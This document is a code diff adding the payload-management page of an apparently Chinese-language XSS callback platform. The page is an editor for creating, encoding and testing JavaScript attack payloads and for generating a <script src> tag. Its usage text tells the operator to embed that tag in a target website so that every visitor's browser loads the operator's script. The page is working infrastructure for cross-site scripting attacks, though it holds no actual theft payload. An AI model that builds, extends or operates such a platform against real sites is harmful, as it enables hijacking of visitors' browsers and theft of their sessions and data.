@@ -1,0 +1,918 @@
+{% extends "base.html" %}
+
+{% block title %}JS管理 - 小绿茶XSS反连平台{% endblock %}
+
+{% block content %}
+<div class="container-fluid py-4">
+    <!-- 页面标题 -->
+    <div class="row mb-4">
+        <div class="col">
+            <h2 class="text-success">
+                <i class="fas fa-code"></i> JS管理
+                <small class="text-muted">Payload Management</small>
+            </h2>
+            <p class="text-muted">创建和管理XSS攻击Payload</p>
+        </div>
+    </div>
+
+    <div class="row">
+        <!-- 左侧：JS文件列表 -->
+        <div class="col-lg-3 mb-4">
+            <div class="card shadow">
+                <div class="card-header py-3 d-flex justify-content-between align-items-center">
+                    <h6 class="m-0 font-weight-bold text-success">
+                        <i class="fas fa-list"></i> JS文件列表
+                    </h6>
+                    <button class="btn btn-sm btn-success" onclick="createNewPayload()">
+                        <i class="fas fa-plus"></i> 新建
+                    </button>
+                </div>
+                <div class="card-body p-0">
+                    <div class="list-group list-group-flush" id="payloadList">
+                        <div class="text-center p-4 text-muted">
+                            <i class="fas fa-spinner fa-spin"></i> 加载中...
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 中间：代码编辑器 -->
+        <div class="col-lg-6 mb-4">
+            <div class="card shadow">
+                <div class="card-header py-3">
+                    <h6 class="m-0 font-weight-bold text-success">
+                        <i class="fas fa-edit"></i> 代码编辑器
+                        <span id="currentFileName" class="text-muted"></span>
+                    </h6>
+                </div>
+                <div class="card-body p-0">
+                    <!-- 工具栏 -->
+                    <div class="toolbar bg-light border-bottom p-2">
+                        <div class="btn-group btn-group-sm" role="group">
+                            <button type="button" class="btn btn-outline-success" onclick="formatCode()" title="格式化代码">
+                                <i class="fas fa-magic"></i> 格式化
+                            </button>
+                            <button type="button" class="btn btn-outline-info" onclick="insertTemplate()" title="插入模板">
+                                <i class="fas fa-file-import"></i> 插入模板
+                            </button>
+                            <button type="button" class="btn btn-outline-warning" onclick="encodePayload()"
+                                title="编码工具">
+                                <i class="fas fa-shield-alt"></i> 编码
+                            </button>
+                            <button class="btn btn-primary" onclick="generateScriptPayload()" id="generateScriptBtn"
+                                disabled>
+                                <i class="fas fa-code"></i> 生成Payload
+                            </button>
+                        </div>
+                        <!-- 添加Ctrl+S提示 -->
+                        <div class="ms-3 d-flex align-items-center">
+                            <small class="text-muted">
+                                <i class="fas fa-keyboard"></i> 提示: 使用 Ctrl+S 保存文件
+                            </small>
+                        </div>
+
+                        <!-- 模板选择下拉框 -->
+                        <select class="form-select form-select-sm d-inline-block w-auto ms-2" id="templateSelect"
+                            style="display: none !important;">
+                            <option value="">选择模板...</option>
+                        </select>
+                    </div>
+
+                    <!-- 代码编辑器 -->
+                    <div class="editor-container">
+                        <textarea id="codeEditor" placeholder="在这里编写你的JavaScript代码..."></textarea>
+                    </div>
+
+                    <!-- 编辑器底部信息 -->
+                    <div class="editor-footer bg-light border-top p-2">
+                        <div class="row">
+                            <div class="col">
+                                <small class="text-muted">
+                                    <i class="fas fa-info-circle"></i>
+                                    <span id="editorStatus">就绪</span>
+                                </small>
+                                <small class="text-primary ms-2">
+                                    <i class="fas fa-lightbulb"></i> 使用 Ctrl+S 保存
+                                </small>
+                            </div>
+                            <div class="col text-end">
+                                <small class="text-muted">
+                                    <span id="cursorPosition">行 1, 列 1</span>
+                                </small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 右侧：文件信息和操作 -->
+        <div class="col-lg-3 mb-4">
+            <!-- 文件信息 -->
+            <div class="card shadow mb-4">
+                <div class="card-header py-3">
+                    <h6 class="m-0 font-weight-bold text-success">
+                        <i class="fas fa-info-circle"></i> 文件信息
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <div id="fileInfo" class="text-muted text-center">
+                        <i class="fas fa-file-code fa-2x mb-2"></i>
+                        <p>请选择一个文件</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 快速操作 -->
+            <div class="card shadow mb-4">
+                <div class="card-header py-3">
+                    <h6 class="m-0 font-weight-bold text-success">
+                        <i class="fas fa-bolt"></i> 快速操作
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <div class="d-grid gap-2">
+                        <button class="btn btn-success" onclick="savePayload()" id="saveBtn" disabled>
+                            <i class="fas fa-save"></i> 保存文件
+                        </button>
+                        <button class="btn btn-info" onclick="testPayload()" id="testBtn" disabled>
+                            <i class="fas fa-play"></i> 测试Payload
+                        </button>
+                        <button class="btn btn-warning" onclick="generatePayloadUrl()" id="generateBtn" disabled>
+                            <i class="fas fa-link"></i> 生成URL
+                        </button>
+                        <button class="btn btn-danger" onclick="deletePayload()" id="deleteBtn" disabled>
+                            <i class="fas fa-trash"></i> 删除文件
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Payload URL -->
+            <div class="card shadow" id="payloadUrlCard" style="display: none;">
+                <div class="card-header py-3">
+                    <h6 class="m-0 font-weight-bold text-success">
+                        <i class="fas fa-link"></i> Payload URL
+                    </h6>
+                </div>
+                <div class="card-body">
+                    <div class="input-group input-group-sm">
+                        <input type="text" class="form-control" id="payloadUrl" readonly>
+                        <button class="btn btn-outline-success" onclick="copyPayloadUrl()">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                    </div>
+                    <small class="text-muted mt-2 d-block">
+                        将此URL嵌入目标网站
+                    </small>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- 新建Payload模态框 -->
+<div class="modal fade" id="createPayloadModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">
+                    <i class="fas fa-plus"></i> 新建JS文件
+                </h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <form id="createPayloadForm">
+                    <div class="mb-3">
+                        <label for="payloadName" class="form-label">文件名</label>
+                        <div class="input-group">
+                            <input type="text" class="form-control" id="payloadName" required>
+                            <span class="input-group-text">.js</span>
+                        </div>
+                        <div class="form-text">文件名不能包含特殊字符</div>
+                    </div>
+                    <div class="mb-3">
+                        <label for="payloadDescription" class="form-label">文件描述</label>
+                        <textarea class="form-control" id="payloadDescription" rows="3"
+                            placeholder="描述这个Payload的用途..."></textarea>
+                    </div>
+                </form>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>
+                <button type="button" class="btn btn-success" onclick="copyEncoded()">
+                    <i class="fas fa-copy"></i> 复制结果
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- 插入模板模态框 -->
+<div class="modal fade" id="insertTemplateModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">
+                    <i class="fas fa-file-import"></i> 插入模板
+                </h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <div class="mb-3">
+                    <label for="templateSelectModal" class="form-label">选择模板</label>
+                    <select class="form-select" id="templateSelectModal">
+                        <option value="">请选择模板...</option>
+                    </select>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>
+                <button type="button" class="btn btn-success" onclick="insertSelectedTemplate()">
+                    <i class="fas fa-plus"></i> 插入
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- 编码工具模态框 -->
+<div class="modal fade" id="encodeModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">
+                    <i class="fas fa-shield-alt"></i> Payload编码工具
+                </h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <div class="mb-3">
+                    <label for="encodeInput" class="form-label">输入内容</label>
+                    <textarea class="form-control" id="encodeInput" rows="4" placeholder="输入要编码的内容..."></textarea>
+                </div>
+                <div class="mb-3">
+                    <label class="form-label">编码方式</label>
+                    <div class="form-check">
+                        <input class="form-check-input" type="radio" name="encodeType" value="url" id="encodeUrl"
+                            checked>
+                        <label class="form-check-label" for="encodeUrl">URL编码</label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="radio" name="encodeType" value="base64" id="encodeBase64">
+                        <label class="form-check-label" for="encodeBase64">Base64编码</label>
+                    </div>
+                    <div class="form-check">
+                        <input class="form-check-input" type="radio" name="encodeType" value="html" id="encodeHtml">
+                        <label class="form-check-label" for="encodeHtml">HTML编码</label>
+                    </div>
+                </div>
+                <div class="mb-3">
+                    <label for="encodeOutput" class="form-label">编码结果</label>
+                    <textarea class="form-control" id="encodeOutput" rows="4" readonly></textarea>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">关闭</button>
+                <button type="button" class="btn btn-success" onclick="copyEncoded()">
+                    <i class="fas fa-copy"></i> 复制结果
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- 生成Payload模态框 -->
+<div class="modal fade" id="scriptPayloadModal" tabindex="-1">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">
+                    <i class="fas fa-code"></i> 生成Script Payload
+                </h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <div class="mb-3">
+                    <label class="form-label">Payload代码</label>
+                    <div class="input-group">
+                        <input type="text" class="form-control" id="scriptPayload" readonly>
+                        <button class="btn btn-outline-success" onclick="copyScriptPayload()">
+                            <i class="fas fa-copy"></i> 复制
+                        </button>
+                    </div>
+                </div>
+                <div class="mb-3">
+                    <label class="form-label">使用说明</label>
+                    <div class="alert alert-info">
+                        <small>
+                            <i class="fas fa-info-circle"></i>
+                            将上面的代码嵌入到目标网站的HTML中，当用户访问该页面时就会加载并执行你的JavaScript文件。
+                        </small>
+                    </div>
+                </div>
+                <div class="mb-3">
+                    <label class="form-label">预览</label>
+                    <div class="bg-light p-3 rounded">
+                        <code id="scriptPayloadPreview"></code>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">关闭</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+{% endblock %}
+
+{% block scripts %}
+<script src="{{ url_for('static', filename='js/editor.js') }}"></script>
+<script>
+    let currentPayload = null;
+    let payloads = [];
+    let templates = [];
+    let editor = null;
+
+    $(document).ready(function () {
+        console.log('初始化Payload页面');
+
+        // 检查剪贴板API支持情况
+        if (!navigator.clipboard) {
+            console.warn('Clipboard API 不支持，将使用降级方案');
+            // 可以在这里添加一些UI提示
+            if (!window.isSecureContext) {
+                console.info('建议使用HTTPS以获得更好的剪贴板支持');
+            }
+        }
+
+        initEditor();
+        loadPayloads();
+        loadTemplates();
+
+        checkPayloadDirectory();
+    });
+    // 添加检查目录权限的函数
+    function checkPayloadDirectory() {
+        console.log('检查Payload目录权限...');
+        $.get('/api/payloads')
+            .done(function (data) {
+                console.log('Payload目录检查成功，文件数量:', data.length);
+            })
+            .fail(function (xhr) {
+                console.error('Payload目录检查失败:', xhr.status, xhr.responseText);
+            });
+    }
+    function initEditor() {
+        editor = CodeMirror.fromTextArea(document.getElementById('codeEditor'), {
+            mode: 'javascript',
+            theme: 'monokai',
+            lineNumbers: true,
+            autoCloseBrackets: true,
+            matchBrackets: true,
+            indentUnit: 4,
+            tabSize: 4,
+            indentWithTabs: false,
+            lineWrapping: true,
+            foldGutter: true,
+            gutters: ["CodeMirror-linenumbers", "CodeMirror-foldgutter"]
+        });
+
+        // 监听编辑器变化
+        editor.on('change', function () {
+            $('#editorStatus').html('<i class="fas fa-circle text-warning"></i> 未保存');
+            updateCursorPosition();
+        });
+
+        editor.on('cursorActivity', updateCursorPosition);
+    }
+
+    function updateCursorPosition() {
+        const cursor = editor.getCursor();
+        $('#cursorPosition').text(`行 ${cursor.line + 1}, 列 ${cursor.ch + 1}`);
+    }
+
+    function loadPayloads() {
+        $('#payloadList').html(`
+        <div class="text-center p-4 text-muted">
+            <i class="fas fa-spinner fa-spin"></i> 加载中...
+        </div>
+    `);
+
+        $.get('/api/payloads')
+            .done(function (data) {
+                console.log('加载JS文件成功:', data);
+                // 确保data是数组
+                if (Array.isArray(data)) {
+                    payloads = data;
+                } else {
+                    console.warn('API返回的数据不是数组:', data);
+                    payloads = [];
+                }
+                displayPayloads();
+            })
+            .fail(function (xhr, status, error) {
+                console.error('加载JS文件失败:', error, xhr);
+                payloads = [];
+                displayPayloads();
+                // 只在非取消请求时显示错误
+                if (status !== 'abort') {
+                    showAlert('加载JS文件失败: ' + (xhr.responseJSON?.message || error), 'danger');
+                }
+            });
+    }
+    function loadTemplates() {
+        $.get('/api/templates', function (data) {
+            templates = data;
+            populateTemplateSelect();
+        });
+    }
+
+    function populateTemplateSelect() {
+        const select = $('#templateSelectModal');
+        select.empty().append('<option value="">请选择模板...</option>');
+
+        templates.forEach(function (template) {
+            select.append(`<option value="${template.filename}">${template.name}</option>`);
+        });
+    }
+
+    function displayPayloads() {
+        const payloadList = $('#payloadList');
+
+        console.log('显示JS文件列表，数据:', payloads);
+
+        // 确保payloads是数组
+        if (!payloads || !Array.isArray(payloads) || payloads.length === 0) {
+            payloadList.html(`
+            <div class="text-center p-4 text-muted">
+                <i class="fas fa-file-code fa-2x mb-2"></i>
+                <p>暂无JS文件</p>
+                <small>请创建新的JS文件</small>
+            </div>
+        `);
+            return;
+        }
+
+        let html = '';
+        payloads.forEach(function (payload) {
+            // 添加数据验证
+            if (!payload || !payload.filename) {
+                console.warn('无效的payload数据:', payload);
+                return;
+            }
+
+            const name = payload.name || payload.filename.replace('.js', '');
+            // 修复：正确处理文件大小，确保是数字
+            const size = payload.size ? (payload.size / 1024).toFixed(1) : '0.0';
+            const modified = payload.modified ? new Date(payload.modified).toLocaleString('zh-CN') : '未知';
+
+            // 使用JSON.stringify来安全地转义字符串
+            const safeFilename = payload.filename.replace(/'/g, "\\'").replace(/"/g, '&quot;');
+
+            html += `
+            <a href="#" class="list-group-item list-group-item-action payload-item" 
+               data-filename="${payload.filename.replace(/"/g, '&quot;')}" 
+               onclick="selectPayload('${safeFilename}')">
+                <div class="d-flex w-100 justify-content-between">
+                    <h6 class="mb-1">
+                        <i class="fas fa-file-code text-success"></i> ${name.replace(/</g, '&lt;').replace(/>/g, '&gt;')}
+                    </h6>
+                    <small class="text-muted">${size} KB</small>
+                </div>
+                <p class="mb-1 text-muted">最后修改: ${modified}</p>
+            </a>
+        `;
+        });
+
+        payloadList.html(html);
+
+        // 如果有文件，默认选择第一个
+        if (payloads.length > 0 && payloads[0].filename) {
+            selectPayload(payloads[0].filename);
+        }
+    }
+    function selectPayload(filename) {
+        console.log('选择文件:', filename);
+
+        // 更新选中状态
+        $('.payload-item').removeClass('active');
+        $(`[data-filename="${filename.replace(/"/g, '&quot;')}"]`).addClass('active');
+
+        // 加载文件内容
+        $.get(`/api/payloads/${encodeURIComponent(filename)}`)
+            .done(function (data) {
+                currentPayload = filename;
+
+                // 设置编辑器内容
+                editor.setValue(data.content);
+                $('#currentFileName').text(filename);
+                $('#editorStatus').html('<i class="fas fa-circle text-success"></i> 已加载');
+
+                // 更新文件信息
+                const payload = payloads.find(p => p.filename === filename);
+                if (payload) {
+                    $('#fileInfo').html(`
+                <div class="text-start">
+                    <p><strong>文件名:</strong> ${payload.name || filename}</p>
+                    <p><strong>大小:</strong> ${(payload.size / 1024).toFixed(1)} KB</p>
+                    <p><strong>修改时间:</strong><br>${new Date(payload.modified).toLocaleString('zh-CN')}</p>
+                    <p><strong>行数:</strong> ${editor.lineCount()}</p>
+                </div>
+            `);
+                }
+
+                // 启用按钮
+                $('#saveBtn, #testBtn, #generateBtn, #deleteBtn,#generateScriptBtn').prop('disabled', false);
+
+
+            })
+            .fail(function (xhr, status, error) {
+                console.error('加载文件内容失败:', error);
+                showAlert('加载文件内容失败: ' + (xhr.responseJSON?.error || error), 'danger');
+            });
+    }
+    function createNewPayload() {
+        $('#createPayloadModal').modal('show');
+    }
+
+    function createPayload() {
+        const name = $('#payloadName').val().trim();
+        const description = $('#payloadDescription').val().trim();
+
+        if (!name) {
+            showAlert('请输入文件名', 'warning');
+            return;
+        }
+
+        // 验证文件名
+        if (!/^[a-zA-Z0-9_-]+$/.test(name)) {
+            showAlert('文件名只能包含字母、数字、下划线和短横线', 'warning');
+            return;
+        }
+
+        $.ajax({
+            url: '/api/payloads',
+            method: 'POST',
+            contentType: 'application/json',
+            data: JSON.stringify({
+                filename: name,
+                content: '// XSS Payload\n// ' + (description || '新建Payload') + '\n\n',
+                description: description
+            }),
+            success: function (response) {
+                if (response.success) {
+                    $('#createPayloadModal').modal('hide');
+                    $('#createPayloadForm')[0].reset();
+                    showAlert('文件创建成功', 'success');
+                    loadPayloads();
+                } else {
+                    showAlert(response.message, 'danger');
+                }
+            },
+            error: function () {
+                showAlert('创建失败，请重试', 'danger');
+            }
+        });
+    }
+
+    function savePayload() {
+        if (!currentPayload) return;
+
+        const content = editor.getValue();
+
+        $.ajax({
+            url: '/api/payloads',
+            method: 'POST',
+            contentType: 'application/json',
+            data: JSON.stringify({
+                filename: currentPayload,
+                content: content
+            }),
+            success: function (response) {
+                if (response.success) {
+                    showAlert('文件保存成功', 'success');
+                    $('#editorStatus').html('<i class="fas fa-circle text-success"></i> 已保存');
+                    loadPayloads(); // 重新加载列表以更新文件大小等信息
+                } else {
+                    showAlert(response.message, 'danger');
+                }
+            },
+            error: function () {
+                showAlert('保存失败，请重试', 'danger');
+            }
+        });
+    }
+
+    function autoSave() {
+        if (currentPayload && editor.isClean() === false) {
+            savePayload();
+        }
+    }
+
+    function formatCode() {
+        const code = editor.getValue();
+
+        $.ajax({
+            url: '/api/utils/format-js',
+            method: 'POST',
+            contentType: 'application/json',
+            data: JSON.stringify({ code: code }),
+            success: function (response) {
+                if (response.formatted) {
+                    editor.setValue(response.formatted);
+                    showAlert('代码已格式化', 'success');
+                }
+            },
+            error: function () {
+                showAlert('格式化失败', 'danger');
+            }
+        });
+    }
+
+    function insertTemplate() {
+        $('#insertTemplateModal').modal('show');
+    }
+
+    function insertSelectedTemplate() {
+        const selectedTemplate = $('#templateSelectModal').val();
+
+        if (!selectedTemplate) {
+            showAlert('请选择一个模板', 'warning');
+            return;
+        }
+
+        $.get(`/api/templates/${selectedTemplate}`, function (data) {
+            const currentCode = editor.getValue();
+            const newCode = currentCode + '\n' + data.content;
+            editor.setValue(newCode);
+
+            $('#insertTemplateModal').modal('hide');
+            showAlert('模板已插入', 'success');
+        }).fail(function () {
+            showAlert('加载模板失败', 'danger');
+        });
+    }
+
+    function encodePayload() {
+        $('#encodeModal').modal('show');
+    }
+
+    $('#encodeInput').on('input', function () {
+        const input = $(this).val();
+        const type = $('input[name="encodeType"]:checked').val();
+
+        if (!input) {
+            $('#encodeOutput').val('');
+            return;
+        }
+
+        $.ajax({
+            url: '/api/utils/encode-payload',
+            method: 'POST',
+            contentType: 'application/json',
+            data: JSON.stringify({
+                payload: input,
+                type: type
+            }),
+            success: function (response) {
+                $('#encodeOutput').val(response.encoded);
+            }
+        });
+    });
+
+    $('input[name="encodeType"]').change(function () {
+        $('#encodeInput').trigger('input');
+    });
+
+    function copyEncoded() {
+        const output = $('#encodeOutput').val();
+        if (!output) {
+            showAlert('没有内容可复制', 'warning');
+            return;
+        }
+
+        copyToClipboard(output).then(function (success) {
+            if (success) {
+                showAlert('已复制到剪贴板', 'success');
+            } else {
+                showAlert('复制失败，请手动选择文本复制', 'warning');
+            }
+        });
+    }
+
+    function testPayload() {
+        if (!currentPayload) return;
+
+        const content = editor.getValue();
+
+        // 创建测试页面
+        const testWindow = window.open('', '_blank', 'width=800,height=600');
+        testWindow.document.write(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Payload测试 - ${currentPayload}</title>
+            <style>
+                body { font-family: Arial, sans-serif; margin: 20px; }
+                .header { background: #f8f9fa; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
+                .code { background: #f8f9fa; padding: 15px; border-radius: 5px; font-family: monospace; }
+                .result { margin-top: 20px; padding: 15px; border-radius: 5px; }
+                .success { background: #d4edda; color: #155724; }
+                .error { background: #f8d7da; color: #721c24; }
+            </style>
+        </head>
+        <body>
+            <div class="header">
+                <h3>Payload测试: ${currentPayload}</h3>
+                <p>正在执行JavaScript代码...</p>
+            </div>
+            
+            <div class="code">
+                <h4>代码内容:</h4>
+                <pre>${content}</pre>
+            </div>
+            
+            <div id="result" class="result">
+                <h4>执行结果:</h4>
+                <p>等待执行...</p>
+            </div>
+            
+            <script>
+                try {
+                    ${content}
+                    document.getElementById('result').innerHTML = '<h4>执行结果:</h4><p class="success">✅ JavaScript代码执行成功！</p><p>请检查浏览器控制台查看详细输出。</p>';
+                } catch (error) {
+                    document.getElementById('result').innerHTML = '<h4>执行结果:</h4><p class="error">❌ JavaScript代码执行失败:</p><pre>' + error.message + '</pre>';
+                }
+            <\/script>
+</body>
+
+</html>
+`);
+    }
+
+    function generatePayloadUrl() {
+        if (!currentPayload) return;
+
+        const baseUrl = window.location.origin;
+        const payloadUrl = `${baseUrl}/payloads/${currentPayload}`;
+
+        $('#payloadUrl').val(payloadUrl);
+        $('#payloadUrlCard').show();
+    }
+
+    function copyPayloadUrl() {
+        const payloadUrl = $('#payloadUrl').val();
+        
+        if (!payloadUrl) {
+            showAlert('没有URL可复制', 'warning');
+            return;
+        }
+
+        copyToClipboard(payloadUrl).then(function (success) {
+            if (success) {
+                showAlert('已复制到剪贴板', 'success');
+            } else {
+                showAlert('复制失败，请手动选择文本复制', 'warning');
+            }
+        });
+    }
+
+    function deletePayload() {
+        if (!currentPayload) return;
+
+        if (confirm(`确定要删除文件 "${currentPayload}" 吗？此操作不可恢复。`)) {
+            $.ajax({
+                url: '/api/payloads',
+                method: 'DELETE',
+                contentType: 'application/json',
+                data: JSON.stringify({
+                    filename: currentPayload
+                }),
+                success: function (response) {
+                    if (response.success) {
+                        showAlert('文件删除成功', 'success');
+                        loadPayloads();
+
+                        // 清空编辑器
+                        editor.setValue('');
+                        $('#currentFileName').text('');
+                        $('#fileInfo').html(`
+<div class="text-muted text-center">
+    <i class="fas fa-file-code fa-2x mb-2"></i>
+    <p>请选择一个文件</p>
+</div>
+`);
+                        $('#saveBtn, #testBtn, #generateBtn, #deleteBtn, #generateScriptBtn').prop('disabled', true);
+                        $('#payloadUrlCard').hide();
+                        currentPayload = null;
+                    } else {
+                        showAlert(response.message, 'danger');
+                    }
+                },
+                error: function () {
+                    showAlert('删除失败，请重试', 'danger');
+                }
+            });
+        }
+    }
+
+
+    function generateScriptPayload() {
+        if (!currentPayload) return;
+
+        const baseUrl = window.location.origin;
+        const payloadUrl = `${baseUrl}/payloads/${currentPayload}`;
+        const scriptPayload = `<script src='${payloadUrl}'><\/script>`;
+
+        $('#scriptPayload').val(scriptPayload);
+        $('#scriptPayloadPreview').text(scriptPayload);
+        $('#scriptPayloadModal').modal('show');
+    }
+
+// 使用事件委托处理模态框中的复制按钮
+$(document).on('click', '#scriptPayloadModal .btn-outline-success', function(e) {
+    e.preventDefault();
+    copyScriptPayloadDirect();
+});
+
+function copyScriptPayloadDirect() {
+    const input = document.getElementById('scriptPayload');
+    if (!input || !input.value) {
+        showAlert('请先生成Payload', 'warning');
+        return;
+    }
+    
+    // 确保输入框获得焦点
+    input.focus();
+    input.select();
+    
+    // 使用现代 Clipboard API
+    if (navigator.clipboard) {
+        navigator.clipboard.writeText(input.value).then(() => {
+            showAlert('Payload代码已复制到剪贴板', 'success');
+        }).catch(() => {
+            // 降级方案
+            try {
+                document.execCommand('copy');
+                showAlert('Payload代码已复制到剪贴板', 'success');
+            } catch (err) {
+                showAlert('已选中文本，请按 Ctrl+C 手动复制', 'info');
+            }
+        });
+    } else {
+        // 降级方案
+        try {
+            document.execCommand('copy');
+            showAlert('Payload代码已复制到剪贴板', 'success');
+        } catch (err) {
+            showAlert('已选中文本，请按 Ctrl+C 手动复制', 'info');
+        }
+    }
+}
+
+
+
+    // 通用的复制到剪贴板函数
+    function copyToClipboard(text) {
+        // 方法1: 使用现代的 Clipboard API
+        if (navigator.clipboard && window.isSecureContext) {
+            return navigator.clipboard.writeText(text).then(function () {
+                return true;
+            }).catch(function (err) {
+                console.warn('Clipboard API 失败:', err);
+                return false;
+            });
+        }
+
+        // 方法2: 使用 document.execCommand 作为降级方案
+        else {
+            try {
+                const textArea = document.createElement('textarea');
+                textArea.value = text;
+
+                // 避免滚动到底部
+                textArea.style.top = '0';
+                textArea.style.left = '0';
+                textArea.style.position = 'fixed';
+                textArea.style.opacity = '0';
+
+                document.body.appendChild(textArea);
+                textArea.focus();
+                textArea.select();
+
+                const successful = document.execCommand('copy');
+                document.body.removeChild(textArea);
+
+                return Promise.resolve(successful);
+            } catch (err) {
+                console.warn('execCommand 复制失败:', err);
+                return Promise.resolve(false);
+            }
+        }
+    }
+</script>
+{% endblock %}
